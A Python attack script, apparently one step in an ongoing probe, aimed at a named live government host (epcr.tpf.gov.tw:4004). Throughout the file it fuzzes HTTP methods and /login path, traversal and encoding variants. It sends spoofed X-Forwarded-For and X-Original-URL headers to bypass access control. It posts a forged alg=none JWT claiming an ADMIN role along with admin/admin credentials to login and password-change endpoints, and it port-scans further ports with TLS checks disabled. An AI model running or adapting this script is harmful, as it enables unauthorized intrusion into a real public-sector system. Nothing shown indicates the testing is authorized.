#!/usr/bin/env python3
"""最终穷举 4004 - HTTP 方法变体 + Header 注入 + 路径变体 + Socket.IO + 端口探测."""
import ssl
import json
import socket
import urllib.request
import urllib.error

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

BASE = "https://epcr.tpf.gov.tw:4004"

def probe(method, path, body=None, headers=None, timeout=10):
    url = BASE + path
    data = None
    h = {"User-Agent": "Mozilla/5.0"}
    if body is not None:
        data = json.dumps(body).encode("utf-8")
        h["Content-Type"] = "application/json"
    if headers:
        h.update(headers)
    req = urllib.request.Request(url, data=data, headers=h, method=method)
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
            body_bytes = resp.read()
            body_text = body_bytes.decode("utf-8", "replace")[:300]
            print(f"[{resp.status}] {method:6s} {path:<50s}  body={body_text!r}")
            return resp.status, body_bytes
    except urllib.error.HTTPError as e:
        body_bytes = e.read()
        body_text = body_bytes.decode("utf-8", "replace")[:300]
        print(f"[{e.code}] {method:6s} {path:<50s}  body={body_text!r}")
        return e.code, body_bytes
    except Exception as e:
        print(f"[ERR] {method:6s} {path:<50s}  {type(e).__name__}: {e}")
        return None, None

print("=" * 100)
print("1. HTTP 方法变体 - /captcha/POST/PUT/PATCH/DELETE/OPTIONS")
print("=" * 100)
for method in ["POST", "PUT", "PATCH", "DELETE", "OPTIONS", "HEAD"]:
    probe(method, "/captcha")

print("\n" + "=" * 100)
print("2. 路径变体 - /login 路径遍历/编码")
print("=" * 100)
for p in [
    "/login",
    "/login/",
    "//login",
    "/./login",
    "/../login",
    "/login.json",
    "/login.xml",
    "/login.html",
    "/login;",
    "/login%00",
    "/login%20",
    "/login?",
    "/login?x=1",
    "/login?callback=alert(1)",
    "/login/../login",
    "/Login", "/LOGIN", "/lOgIn",
    "/api/login", "/auth/login", "/v1/login", "/v2/login",
    "/user/login", "/users/login",
    "/api/auth/login", "/oauth/login",
    "/sso/login", "/sso-login",
    "/signin", "/sign-in", "/sign_in",
]:
    probe("GET", p)

print("\n" + "=" * 100)
print("3. Header 注入测试 - 13 种 Header × 4 端点")
print("=" * 100)
headers_to_test = [
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Original-URL": "/login"},
    {"X-Rewrite-URL": "/login"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Override-URL": "/login"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
    {"X-Forwarded-Host": "localhost"},
    {"X-Forwarded-Proto": "https"},
    {"X-Original-Forwarded-For": "127.0.0.1"},
    {"X-Remote-IP": "127.0.0.1"},
    {"X-Remote-Addr": "127.0.0.1"},
    {"X-Client-IP": "127.0.0.1"},
    {"Client-IP": "127.0.0.1"},
]
for hdr in headers_to_test:
    probe("GET", "/login", headers=hdr)
    probe("GET", "/version", headers=hdr)

print("\n" + "=" * 100)
print("4. alg=none JWT 测试")
print("=" * 100)
ALG_NONE_JWT = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6IkFETUlOIiwicGVybWlzc2lvbnMiOlsiQVVUSF9VU0VSX0FMTCJdfQ."
for endpoint in ["/api/login", "/oauth/token", "/api/v1/auth/login", "/Users/changePassword"]:
    for method in ["GET", "POST", "PUT"]:
        probe(method, endpoint, body={"username": "admin", "password": "admin"},
              headers={"Authorization": f"Bearer {ALG_NONE_JWT}"})

print("\n" + "=" * 100)
print("5. 端口扫描 - tpf.gov.tw 8 个未探端口")
print("=" * 100)
import socket
extra_ports = [443, 8080, 8443, 9000, 9090, 7000, 7001, 7002]
for port in extra_ports:
    for proto in ["tcp"]:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        try:
            r = s.connect_ex(("epcr.tpf.gov.tw", port))
            if r == 0:
                print(f"  [OPEN] {proto}/{port}")
            s.close()
        except Exception as e:
            print(f"  [ERR] {proto}/{port}: {e}")
